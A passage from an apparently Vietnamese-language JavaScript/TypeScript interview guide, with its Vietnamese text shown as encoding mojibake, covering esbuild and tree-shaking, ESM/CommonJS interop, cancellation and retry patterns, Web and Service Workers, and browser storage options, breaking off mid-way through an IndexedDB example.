    about: 'src/pages/about.ts',
    contact: 'src/pages/contact.ts',
  },
  bundle: true,
  outdir: 'dist',
  splitting: true, // Enable code splitting
  format: 'esm', // Required for splitting
  chunkNames: 'chunks/[name]-[hash]',
});

// Transform single file (khÃ´ng bundle)
const result = await esbuild.transform(
  'const x: number = 1;',
  {
    loader: 'ts',
    target: 'es2020',
    minify: true,
  }
);
console.log(result.code); // "const x=1;"

// Watch mode cho development
const ctx = await esbuild.context({
  entryPoints: ['src/index.ts'],
  bundle: true,
  outfile: 'dist/bundle.js',
  sourcemap: true,
});

await ctx.watch(); // Watch for file changes
await ctx.serve({ port: 3000 }); // Serve vá»›i dev server

// ============================================
// TREE-SHAKING vá»›i ESM
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * Tree-shaking = Dead Code Elimination
 * - Bundler analyze import/export graph
 * - Remove unused exports tá»« final bundle
 * - CHá»ˆ works vá»›i ESM (static analysis)
 * - CommonJS KHÃ”NG thá»ƒ tree-shake (dynamic)
 */

// utils.ts - Library vá»›i nhiá»u functions
export function usedFunction() {
  console.log('Used');
}

export function unusedFunction() {
  console.log('Unused'); // This will be tree-shaken
}

export function anotherUnused() {
  console.log('Also unused'); // This too
}

// main.ts - Chá»‰ import 1 function
import { usedFunction } from './utils';
usedFunction();

// After bundling vá»›i tree-shaking:
// âœ… usedFunction included in bundle
// âŒ unusedFunction removed (dead code)
// âŒ anotherUnused removed (dead code)

// Side-effects prevent tree-shaking
// utils-with-side-effects.ts
console.log('This runs on import!'); // Side effect!

export function myFunction() {
  return 42;
}

// Even if myFunction unused, file still included due to side-effect
// Solution: Mark as side-effect-free in package.json
// {
//   "sideEffects": false
// }

// Or specify which files have side-effects:
// {
//   "sideEffects": ["*.css", "src/polyfills.ts"]
// }

// ============================================
// CODE SPLITTING & LAZY LOADING
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * Code Splitting = TÃ¡ch code thÃ nh nhiá»u bundles
 * - Initial bundle: Core functionality
 * - Lazy chunks: Load on-demand
 * - Route-based: Load khi navigate to route
 * - Component-based: Load khi component rendered
 */

// React example with lazy loading
import React, { lazy, Suspense } from 'react';

// Lazy load component (code splitting automatic)
const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

// Vue example
import { defineAsyncComponent } from 'vue';

const AsyncComp = defineAsyncComponent(() =>
  import('./components/AsyncComponent.vue')
);

// Manual code splitting vá»›i dynamic import
async function loadFeature() {
  // Webpack/Vite sáº½ tá»± Ä‘á»™ng táº¡o separate chunk
  const { feature } = await import('./heavy-feature');
  feature();
}

// Preload important chunks
document.addEventListener('DOMContentLoaded', () => {
  // Preload chunk for better UX
  import(/* webpackPreload: true */ './important-feature');
});

// ============================================
// INTEROPERABILITY: CJS â†” ESM
// ============================================
/**
 * Vietnamese Explanation:
 * 
 * Mixing CommonJS vÃ  ESM cÃ³ thá»ƒ tricky
 * - ESM cÃ³ thá»ƒ import CJS (Node.js tá»± convert)
 * - CJS KHÃ”NG thá»ƒ synchronously require ESM
 * - Need dynamic import() cho CJS â†’ ESM
 */

// ESM importing CommonJS
import cjsModule from './commonjs-module.js'; // Works
import { namedExport } from './commonjs-module.js'; // Works if exports.namedExport

// CommonJS importing ESM
const esmModule = require('./esm-module.mjs'); // âŒ Error!
// Solution: Use dynamic import
(async () => {
  const esmModule = await import('./esm-module.mjs'); // âœ… Works
})();

// ============================================
// PACKAGE.JSON CONFIGURATION
// ============================================

// Dual package (support both CJS and ESM)
{
  "name": "my-package",
  "version": "1.0.0",
  "type": "module", // Default to ESM
  
  // Exports field (Node.js 12+)
  "exports": {
    ".": {
      "import": "./dist/index.mjs", // ESM version
      "require": "./dist/index.cjs" // CJS version
    },
    "./utils": {
      "import": "./dist/utils.mjs",
      "require": "./dist/utils.cjs"
    }
  },
  
  // Fallback for older tools
  "main": "./dist/index.cjs", // CJS entry
  "module": "./dist/index.mjs", // ESM entry
  
  // TypeScript types
  "types": "./dist/index.d.ts",
  
  // Tree-shaking hints
  "sideEffects": false
}
```

**ğŸ¯ Best Practices:**

1. **Use ESM for new projects**: Better tooling, tree-shaking, future-proof
2. **Mark side-effects**: Set `"sideEffects": false` trong package.json náº¿u possible
3. **Code splitting strategy**: Route-based > Component-based > Manual
4. **Bundle size monitoring**: Use tools nhÆ° webpack-bundle-analyzer
5. **Source maps**: Always generate cho production debugging
6. **External dependencies**: Don't bundle large libraries (React, Lodash) - load tá»« CDN
7. **Dynamic imports**: Use cho features hiáº¿m dÃ¹ng, route-based loading
8. **ESBuild for speed**: 10-100x faster than Webpack, perfect for large projects
9. **Preload critical chunks**: Use `<link rel="modulepreload">` cho important modules
10. **CDN vá»›i ESM**: Use ESM-compatible CDNs nhÆ° Skypack, jsDelivr

**âš ï¸ Common Mistakes:**

```typescript
// âŒ Sai: Mixing require trong ESM
import React from 'react';
const lodash = require('lodash'); // Error trong ESM!

// âœ… ÄÃºng: Consistent import syntax
import React from 'react';
import _ from 'lodash';

// âŒ Sai: Dynamic import path trong top-level ESM
const moduleName = './utils';
import { fn } from moduleName; // Error - must be static!

// âœ… ÄÃºng: Use dynamic import() for runtime paths
const moduleName = './utils';
const { fn } = await import(moduleName);

// âŒ Sai: Forget file extension trong browser ESM
import { add } from './math'; // Error - need .js!

// âœ… ÄÃºng: Always include extension
import { add } from './math.js';

// âŒ Sai: CommonJS exports trong ESM file
export const a = 1;
module.exports = { a }; // Error - can't mix!

// âœ… ÄÃºng: Use ESM syntax only
export const a = 1;
export default { a };

// âŒ Sai: KhÃ´ng config CORS cho ESM tá»« CDN
<script type="module">
  import lib from 'https://wrong-cdn.com/lib.js'; // CORS error!
</script>

// âœ… ÄÃºng: Use ESM-compatible CDNs
<script type="module">
  import lib from 'https://cdn.skypack.dev/lib'; // Works!
</script>
```

**ğŸ“Š Performance Comparison:**

```typescript
// Bundler speed comparison (1000 modules):
// - esbuild: ~0.5s âš¡ (Go-based, parallel)
// - Rollup: ~5s (JavaScript, good tree-shaking)
// - Webpack: ~10s (JavaScript, complex config)
// - Parcel: ~8s (JavaScript, zero-config)

// Bundle size comparison (after tree-shaking):
// - ESM only: 100KB (best tree-shaking)
// - ESM + CJS mixed: 150KB (some dead code)
// - CJS only: 200KB (no tree-shaking)
```

**ğŸ¯ Use Cases:**

- **ESM Native (no bundler)**: Prototypes, small apps, HTTP/2
- **ESBuild**: Large apps cáº§n fast builds, TypeScript projects
- **Rollup**: Libraries cáº§n best tree-shaking
- **Webpack**: Complex apps vá»›i nhiá»u loaders/plugins
- **Vite**: Development vá»›i ESM native, production vá»›i Rollup

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">â¹ï¸ Q38: Cancellation, Concurrency & Retry</span></summary>


**Tráº£ lá»i:**

- Há»§y bá»: `AbortController/AbortSignal` cho fetch/task dÃ i; truyá»n `signal` xuyÃªn suá»‘t Ä‘á»ƒ há»§y chuá»—i async.
- Giá»›i háº¡n Ä‘á»“ng thá»i: dÃ¹ng semaphore/pool Ä‘á»ƒ kiá»ƒm soÃ¡t sá»‘ tÃ¡c vá»¥ cháº¡y song song, trÃ¡nh ngháº½n bÄƒng thÃ´ng hay quota.
- Retry: Ã¡p dá»¥ng backoff + jitter cho lá»—i táº¡m thá»i, kÃ¨m tá»•ng timeout Ä‘á»ƒ khÃ´ng treo vÃ´ háº¡n.

Hoáº¡t Ä‘á»™ng:

- Abort: `controller.abort()` phÃ¡t tÃ­n hiá»‡u; fetch/reader/listener cÃ³ `signal` sáº½ throw DOMException('AbortError') vÃ  dá»«ng sá»›m.
- Concurrency: hÃ ng Ä‘á»£i Ä‘á»£i slot trá»‘ng; xong 1 tÃ¡c vá»¥ thÃ¬ phÃ¡t tÃ­n hiá»‡u cho tÃ¡c vá»¥ káº¿.
- Retry: vÃ²ng láº·p báº¯t lá»—i, Ä‘á»£i theo backoff (exponential + jitter), dá»«ng khi Ä‘áº¡t sá»‘ láº§n tá»‘i Ä‘a.

Æ¯u Ä‘iá»ƒm:

- Chá»§ Ä‘á»™ng dá»«ng tÃ¡c vá»¥ thá»«a (chuyá»ƒn trang, Ä‘Ã³ng modal).
- Giáº£m táº£i server/trÃ¬nh duyá»‡t, trÃ¡nh bÃ£o request.
- TÄƒng Ä‘á»™ tin cáº­y khi máº¡ng khÃ´ng á»•n Ä‘á»‹nh.

NhÆ°á»£c Ä‘iá»ƒm:

- Cáº§n lan truyá»n `signal` qua nhiá»u lá»›p API.
- Retry sai loáº¡i lá»—i cÃ³ thá»ƒ tá»‡ hÆ¡n (spam server).
- Tá»‘i Æ°u concurrency khÃ´ng Ä‘Ãºng ngá»¯ cáº£nh váº«n cÃ³ thá»ƒ ngháº½n.

ChÃº thÃ­ch: Chá»‰ retry lá»—i táº¡m thá»i (5xx, ECONNRESET); khÃ´ng retry 4xx trá»« khi cÃ³ lÃ½ do rÃµ rÃ ng.

**Code Example:**

```ts
// 1) Abort fetch vá»›i timeout
function fetchWithTimeout(url: string, ms = 5000) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), ms);
  return fetch(url, { signal: ctrl.signal }).finally(() => clearTimeout(t));
}

// 2) Concurrency limit (semaphore Ä‘Æ¡n giáº£n)
function createLimiter(max: number) {
  let active = 0;
  const queue: Array<() => void> = [];
  const next = () => {
    active--;
    queue.shift()?.();
  };
  return async function run<T>(fn: () => Promise<T>): Promise<T> {
    if (active >= max) await new Promise<void>((res) => queue.push(res));
    active++;
    try {
      return await fn();
    } finally {
      next();
    }
  };
}

// 3) Retry + backoff + jitter
async function retry<T>(op: () => Promise<T>, tries = 3) {
  let attempt = 0;
  while (true) {
    try {
      return await op();
    } catch (e) {
      if (++attempt >= tries) throw e;
      const base = 2 ** attempt * 100;
      const jitter = Math.random() * 100;
      await new Promise((r) => setTimeout(r, base + jitter));
    }
  }
}
```

**Best Practices:**

- Truyá»n `signal` xuyÃªn suá»‘t chain APIs Ä‘á»ƒ há»§y gá»n
- Äáº·t timeout tá»•ng; Ä‘o vÃ  Ä‘iá»u chá»‰nh max concurrency theo tÃ i nguyÃªn
- Chá»‰ retry cho lá»—i táº¡m thá»i (5xx, network)

**Mistakes:**

```ts
// âŒ Retry vÃ´ háº¡n, khÃ´ng jitter â†’ dá»“n táº£i (thundering herd)
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ‘· Q39: Web Workers, Service Worker & PWA Basics</span></summary>


**Tráº£ lá»i:**

- Web Worker: cháº¡y song song, khÃ´ng truy cáº­p DOM
- Service Worker: proxy network, cache offline, cáº§n HTTPS/origin chuáº©n
- PWA: manifest + SW + HTTPS

**Code Example:**

```ts
// worker.ts
self.onmessage = (e) => {
  const n: number = e.data;
  postMessage(n * 2);
};

// main.ts
const worker = new Worker(new URL('./worker.ts', import.meta.url));
worker.postMessage(21);
worker.onmessage = (e) => console.log(e.data); // 42

// service worker (sw.js)
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open('v1').then((c) => c.addAll(['/', '/style.css'])));
});
self.addEventListener('fetch', (e) => {
  e.respondWith(caches.match(e.request).then((r) => r || fetch(e.request)));
});
```

**Best Practices:**

- Worker: truyá»n dá»¯ liá»‡u nhá»/gá»n; dÃ¹ng transferable (ArrayBuffer) cho hiá»‡u nÄƒng
- SW: version cache, chiáº¿n lÆ°á»£c network (Stale-While-Revalidate, CacheFirst,...)

**Mistakes:**

```ts
// âŒ DÃ¹ng DOM API bÃªn trong Worker â†’ khÃ´ng cÃ³ sáºµn
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ’½ Q40: Browser Storage - LocalStorage, SessionStorage, Cookie & IndexedDB</span></summary>


**Tráº£ lá»i:**

Browser cung cáº¥p **4 cÃ¡ch lÆ°u trá»¯ data** á»Ÿ client-side, má»—i cÃ¡ch phÃ¹ há»£p cho use case khÃ¡c nhau:

- **Cookie**: Nhá» (4KB), gá»­i kÃ¨m má»—i HTTP request, cÃ³ expiry, dÃ¹ng cho auth tokens
- **LocalStorage**: 5-10MB, persistent (khÃ´ng máº¥t khi Ä‘Ã³ng tab), sync API, dÃ¹ng cho settings/preferences
- **SessionStorage**: 5-10MB, máº¥t khi Ä‘Ã³ng tab, sync API, dÃ¹ng cho temporary data
- **IndexedDB**: 50MB-unlimited, async, database-like, dÃ¹ng cho large datasets

#### **ğŸ“Š So SÃ¡nh 4 Loáº¡i Storage**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    BROWSER STORAGE COMPARISON                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                        â”‚
â”‚  TiÃªu ChÃ­          â”‚ Cookie    â”‚ LocalStorage â”‚ SessionStorage â”‚ IndexedDB â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚
â”‚  Dung lÆ°á»£ng        â”‚ 4KB       â”‚ 5-10MB       â”‚ 5-10MB         â”‚ 50MB+     â”‚
â”‚  Tá»“n táº¡i           â”‚ Expiry    â”‚ MÃ£i mÃ£i      â”‚ ÄÃ³ng tab máº¥t   â”‚ MÃ£i mÃ£i   â”‚
â”‚  API               â”‚ Sync      â”‚ Sync         â”‚ Sync           â”‚ Async     â”‚
â”‚  Gá»­i server        â”‚ âœ… Tá»± Ä‘á»™ngâ”‚ âŒ KhÃ´ng     â”‚ âŒ KhÃ´ng       â”‚ âŒ KhÃ´ng  â”‚
â”‚  Complexity        â”‚ Medium    â”‚ Easy         â”‚ Easy           â”‚ Hard      â”‚
â”‚  Use Case          â”‚ Auth      â”‚ Settings     â”‚ Form data      â”‚ Big data  â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚
â”‚                                                                        â”‚
â”‚  ğŸª Cookie:        NhÆ° tem dÃ¡n lÃªn thÆ° gá»­i Ä‘i (má»i request)          â”‚
â”‚  ğŸ’¾ LocalStorage:  NhÆ° USB drive (cáº¯m mÃ£i mÃ£i)                        â”‚
â”‚  ğŸ“ SessionStorage: NhÆ° giáº¥y nhÃ¡p (háº¿t giá» lÃ  vá»©t)                    â”‚
â”‚  ğŸ—„ï¸ IndexedDB:     NhÆ° kho chá»©a lá»›n (chá»©a cáº£ thÃ¹ng hÃ ng)             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

#### **ğŸª 1. Cookie - "Tem DÃ¡n LÃªn Má»i Request"**

**Äáº·c Ä‘iá»ƒm:**
- Dung lÆ°á»£ng nhá»: **4KB** (chá»‰ lÆ°u Ä‘Æ°á»£c text ngáº¯n)
- Tá»± Ä‘á»™ng gá»­i kÃ¨m **má»i HTTP request** tá»›i server
- CÃ³ **expiry date** (tá»± Ä‘á»™ng xÃ³a sau thá»i gian)
- DÃ¹ng cho: **Authentication tokens, user tracking**

**Æ¯u Ä‘iá»ƒm:**
- âœ… Server tá»± Ä‘á»™ng nháº­n (khÃ´ng cáº§n JS)
- âœ… CÃ³ expiry (tá»± Ä‘á»™ng dá»n dáº¹p)
- âœ… Secure flag (HTTPS only), HttpOnly (JS khÃ´ng Ä‘á»c Ä‘Æ°á»£c)

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Nhá» (4KB) - khÃ´ng lÆ°u nhiá»u
- âŒ Tá»‘n bandwidth (gá»­i kÃ¨m má»i request)
- âŒ Phá»©c táº¡p hÆ¡n localStorage

**Code Example:**

```typescript
// ============================================
// COOKIE - VÃ­ Dá»¥ ÄÆ¡n Giáº£n
// ============================================

// 1ï¸âƒ£ SET Cookie - LÆ°u token
function setCookie(name: string, value: string, days: number = 7) {
  const date = new Date();
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000); // TÃ­nh expiry
  const expires = `expires=${date.toUTCString()}`;
  
  // LÆ°u cookie
  document.cookie = `${name}=${value}; ${expires}; path=/; SameSite=Strict`;
  // path=/     â†’ cookie cÃ³ hiá»‡u lá»±c toÃ n site
  // SameSite   â†’ báº£o máº­t CSRF
}

// Usage: LÆ°u auth token
setCookie('authToken', 'abc123xyz', 7); // Háº¿t háº¡n sau 7 ngÃ y

// 2ï¸âƒ£ GET Cookie - Äá»c token
function getCookie(name: string): string | null {
  // document.cookie = "authToken=abc123; userId=456; theme=dark"
  const cookies = document.cookie.split('; ');
  
  for (const cookie of cookies) {
    const [key, value] = cookie.split('=');
    if (key === name) return value;
  }
  
  return null; // KhÃ´ng tÃ¬m tháº¥y
}

// Usage: Äá»c auth token
const token = getCookie('authToken');
console.log(token); // "abc123xyz"

// 3ï¸âƒ£ DELETE Cookie - XÃ³a token (set expiry = quÃ¡ khá»©)
function deleteCookie(name: string) {
  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
}

// Usage: Logout - xÃ³a token
deleteCookie('authToken');

// ============================================
// Thá»±c Táº¿: Cookie Helper Class
// ============================================
class CookieManager {
  // Set cookie
  static set(name: string, value: string, days: number = 7): void {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Strict`;
  }
  
  // Get cookie
  static get(name: string): string | null {
    return document.cookie
      .split('; ')
      .find(row => row.startsWith(name + '='))
      ?.split('=')[1] || null;
  }
  
  // Delete cookie
  static delete(name: string): void {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
  }
}

// Usage: Clean API
CookieManager.set('user', 'John', 30); // LÆ°u 30 ngÃ y
const user = CookieManager.get('user'); // "John"
CookieManager.delete('user'); // XÃ³a
```

---

#### **ğŸ’¾ 2. LocalStorage - "USB Drive - LÆ°u MÃ£i MÃ£i"**

**Äáº·c Ä‘iá»ƒm:**
- Dung lÆ°á»£ng lá»›n: **5-10MB** (tuá»³ browser)
- **Persistent** - khÃ´ng máº¥t khi Ä‘Ã³ng tab/browser
- **Sync API** - dá»… dÃ¹ng
- DÃ¹ng cho: **User settings, preferences, cache data**

**Æ¯u Ä‘iá»ƒm:**
- âœ… Dá»… dÃ¹ng (getItem/setItem)
- âœ… LÆ°u mÃ£i mÃ£i (khÃ´ng tá»± xÃ³a)
- âœ… Dung lÆ°á»£ng lá»›n (5-10MB)

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Sync API (block main thread náº¿u dÃ¹ng nhiá»u)
- âŒ Chá»‰ lÆ°u string (pháº£i JSON.stringify object)
- âŒ KhÃ´ng secure (JS Ä‘á»c Ä‘Æ°á»£c â†’ XSS risk)

**Code Example:**

```typescript
// ============================================
// LOCALSTORAGE - VÃ­ Dá»¥ ÄÆ¡n Giáº£n
// ============================================

// 1ï¸âƒ£ LÆ¯U DATA (setItem)
// LÆ°u string
localStorage.setItem('username', 'John Doe');

// LÆ°u object (pháº£i stringify)
const user = { id: 1, name: 'John', role: 'admin' };
localStorage.setItem('user', JSON.stringify(user));

// LÆ°u array
const cart = [
  { id: 1, name: 'iPhone', price: 999 },
  { id: 2, name: 'AirPods', price: 199 },
];
localStorage.setItem('cart', JSON.stringify(cart));

// 2ï¸âƒ£ Äá»ŒC DATA (getItem)
// Äá»c string
const username = localStorage.getItem('username');
console.log(username); // "John Doe"

// Äá»c object (pháº£i parse)
const userStr = localStorage.getItem('user');
const userObj = userStr ? JSON.parse(userStr) : null;
console.log(userObj); // { id: 1, name: 'John', role: 'admin' }

// Äá»c array
const cartStr = localStorage.getItem('cart');
const cartArray = cartStr ? JSON.parse(cartStr) : [];
console.log(cartArray); // [{ id: 1, ... }, { id: 2, ... }]

// 3ï¸âƒ£ XÃ“A DATA
// XÃ³a 1 item
localStorage.removeItem('username');

// XÃ³a táº¥t cáº£
localStorage.clear();

// 4ï¸âƒ£ CHECK Tá»’N Táº I
if (localStorage.getItem('user')) {
  console.log('User logged in');
} else {
  console.log('Guest');
}

// ============================================
// Thá»±c Táº¿: LocalStorage Helper
// ============================================
class LocalStorageHelper {
  // Set data (tá»± Ä‘á»™ng stringify)
  static set<T>(key: string, value: T): void {
    try {
      const serialized = JSON.stringify(value);
      localStorage.setItem(key, serialized);
    } catch (error) {
      console.error('LocalStorage set error:', error);
    }
  }
  
  // Get data (tá»± Ä‘á»™ng parse)
  static get<T>(key: string, defaultValue: T | null = null): T | null {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (error) {
      console.error('LocalStorage get error:', error);
      return defaultValue;
    }
  }
  
  // Remove item
  static remove(key: string): void {
    localStorage.removeItem(key);
  }
  
  // Clear all
  static clear(): void {
    localStorage.clear();
  }
}

// Usage: Clean API
interface User {
  id: number;
  name: string;
  role: string;
}

const user: User = { id: 1, name: 'John', role: 'admin' };
LocalStorageHelper.set('user', user); // Tá»± stringify

const savedUser = LocalStorageHelper.get<User>('user'); // Tá»± parse
console.log(savedUser?.name); // "John"

LocalStorageHelper.remove('user'); // XÃ³a

// ============================================
// Use Case Thá»±c Táº¿: Theme Switcher
// ============================================
function saveTheme(theme: 'light' | 'dark') {
  localStorage.setItem('theme', theme);
  document.body.className = theme; // Apply theme
}

function loadTheme() {
  const theme = localStorage.getItem('theme') || 'light';
  document.body.className = theme;
}

// On page load
loadTheme();

// On theme button click
document.getElementById('themeBtn')?.addEventListener('click', () => {
  const current = localStorage.getItem('theme') || 'light';
  const newTheme = current === 'light' ? 'dark' : 'light';
  saveTheme(newTheme);
});
```

---

#### **ğŸ“ 3. SessionStorage - "Giáº¥y NhÃ¡p - ÄÃ³ng Tab LÃ  Máº¥t"**

**Äáº·c Ä‘iá»ƒm:**
- Dung lÆ°á»£ng: **5-10MB** (giá»‘ng localStorage)
- **Máº¥t khi Ä‘Ã³ng tab** (khÃ´ng persistent)
- **Sync API** - giá»‘ng localStorage
- DÃ¹ng cho: **Form data, wizard steps, temporary state**

**Æ¯u Ä‘iá»ƒm:**
- âœ… API giá»‘ng localStorage (dá»… há»c)
- âœ… Tá»± Ä‘á»™ng dá»n dáº¹p (Ä‘Ã³ng tab = xÃ³a)
- âœ… Má»—i tab cÃ³ storage riÃªng

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ Máº¥t khi Ä‘Ã³ng tab (khÃ´ng persistent)
- âŒ KhÃ´ng share giá»¯a tabs
- âŒ Sync API (block main thread)

**Code Example:**

```typescript
// ============================================
// SESSIONSTORAGE - VÃ­ Dá»¥ ÄÆ¡n Giáº£n
// ============================================

// API GIá»NG Há»†T LOCALSTORAGE, CHá»ˆ KHÃC TÃŠN!

// 1ï¸âƒ£ LÆ¯U DATA
sessionStorage.setItem('formData', JSON.stringify({
  step: 1,
  name: 'John',
  email: 'john@example.com'
}));

// 2ï¸âƒ£ Äá»ŒC DATA
const formDataStr = sessionStorage.getItem('formData');
const formData = formDataStr ? JSON.parse(formDataStr) : null;
console.log(formData?.step); // 1

// 3ï¸âƒ£ XÃ“A DATA
sessionStorage.removeItem('formData');
sessionStorage.clear(); // XÃ³a táº¥t cáº£

// ============================================
// Use Case: Multi-Step Form (Wizard)
// ============================================
interface FormState {
  currentStep: number;
  data: {
    name?: string;
    email?: string;
    address?: string;
  };
}

class FormWizard {
  private static KEY = 'wizardState';
  
  // LÆ°u state hiá»‡n táº¡i
  static saveState(state: FormState): void {
    sessionStorage.setItem(this.KEY, JSON.stringify(state));
  }
  
  // Äá»c state (auto-load khi refresh page)
  static loadState(): FormState | null {
    const data = sessionStorage.getItem(this.KEY);
    return data ? JSON.parse(data) : null;
  }
  
  // XÃ³a state (sau khi submit)
  static clearState(): void {
    sessionStorage.removeItem(this.KEY);
  }
}

// Usage:
// Step 1: Save form data
FormWizard.saveState({
  currentStep: 1,
  data: { name: 'John', email: 'john@example.com' }
});

// User refresh page â†’ auto-restore
const state = FormWizard.loadState();
if (state) {
  console.log(`Resume from step ${state.currentStep}`);
  // Fill form vá»›i data Ä‘Ã£ lÆ°u
}

// Step 3: Submit success â†’ clear
FormWizard.clearState();

// ============================================
// So SÃ¡nh LocalStorage vs SessionStorage
// ============================================

// Scenario 1: User settings (dÃ¹ng localStorage)
localStorage.setItem('language', 'vi'); // LÆ°u mÃ£i mÃ£i
// â†’ User quay láº¡i sau 1 thÃ¡ng váº«n tháº¥y tiáº¿ng Viá»‡t

// Scenario 2: Shopping cart (dÃ¹ng localStorage)
localStorage.setItem('cart', JSON.stringify(items)); // LÆ°u mÃ£i mÃ£i
// â†’ User Ä‘Ã³ng tab rá»“i má»Ÿ láº¡i, cart váº«n cÃ²n

// Scenario 3: Form draft (dÃ¹ng sessionStorage)
sessionStorage.setItem('draft', JSON.stringify(formData)); // Máº¥t khi Ä‘Ã³ng tab
// â†’ User Ä‘Ã³ng tab = máº¥t draft (khÃ´ng spam localStorage)

// Scenario 4: Search filters (dÃ¹ng sessionStorage)
sessionStorage.setItem('filters', JSON.stringify(filters)); // Per-tab
// â†’ Má»—i tab cÃ³ filter riÃªng, khÃ´ng conflict
```

---

#### **ğŸ—„ï¸ 4. IndexedDB - "Kho Chá»©a Lá»›n - Database TrÃªn Browser"**

**Äáº·c Ä‘iá»ƒm:**
- Dung lÆ°á»£ng: **50MB - unlimited** (chrome: 60% disk)
- **Async API** - khÃ´ng block UI
- **Database-like**: tables, indexes, queries, transactions
- DÃ¹ng cho: **Large datasets, offline apps, caching**

**Æ¯u Ä‘iá»ƒm:**
- âœ… Dung lÆ°á»£ng lá»›n (GB náº¿u user cho phÃ©p)
- âœ… Async (khÃ´ng block UI)
- âœ… Indexes, queries (nhÆ° SQL)
- âœ… Transactions (ACID)

**NhÆ°á»£c Ä‘iá»ƒm:**
- âŒ API phá»©c táº¡p (callback hell)
- âŒ KhÃ³ há»c
- âŒ Overkill cho data nhá»

**Code Example:**

```typescript
// ============================================
// INDEXEDDB - VÃ­ Dá»¥ ÄÆ¡n Giáº£n (Simplified vá»›i Promise)
// ============================================

// 1ï¸âƒ£ Má» DATABASE
function openDB(dbName: string, version: number = 1): Promise<IDBDatabase> {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(dbName, version);
    
    // onupgradeneeded: Cháº¡y khi táº¡o DB láº§n Ä‘áº§u hoáº·c upgrade version
    request.onupgradeneeded = (event) => {
      const db = (event.target as IDBOpenDBRequest).result;
      
      // Táº¡o "table" (gá»i lÃ  objectStore)
      if (!db.objectStoreNames.contains('users')) {
        const store = db.createObjectStore('users', { keyPath: 'id' });
        // keyPath: 'id' â†’ dÃ¹ng field 'id' lÃ m primary key
        
        // Táº¡o index (giá»‘ng SQL index)
        store.createIndex('email', 'email', { unique: true });
        store.createIndex('name', 'name', { unique: false });
      }
    };
    
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// 2ï¸âƒ£ THÃŠM DATA (INSERT)
async function addUser(db: IDBDatabase, user: any): Promise<void> {
  return new Promise((resolve, reject) => {
    // Táº¡o transaction (nhÆ° BEGIN TRANSACTION trong SQL)
    const tx = db.transaction('users', 'readwrite'); // readwrite = cÃ³ thá»ƒ ghi
    const store = tx.objectStore('users');
    
    // ThÃªm data
    const request = store.add(user);
    
    request.onsuccess = () => resolve();
    request.onerror = () => reject(request.error);
  });
}

// 3ï¸âƒ£ Äá»ŒC DATA (SELECT)
async function getUser(db: IDBDatabase, id: number): Promise<any> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly'); // readonly = chá»‰ Ä‘á»c
    const store = tx.objectStore('users');
    
    const request = store.get(id); // TÃ¬m theo primary key
    
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// 4ï¸âƒ£ Äá»ŒC Táº¤T Cáº¢ (SELECT *)
async function getAllUsers(db: IDBDatabase): Promise<any[]> {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly');
    const store = tx.objectStore('users');
    
    const request = store.getAll(); // Láº¥y táº¥t cáº£
    
    request.onsuccess = () => resolve(request.result);
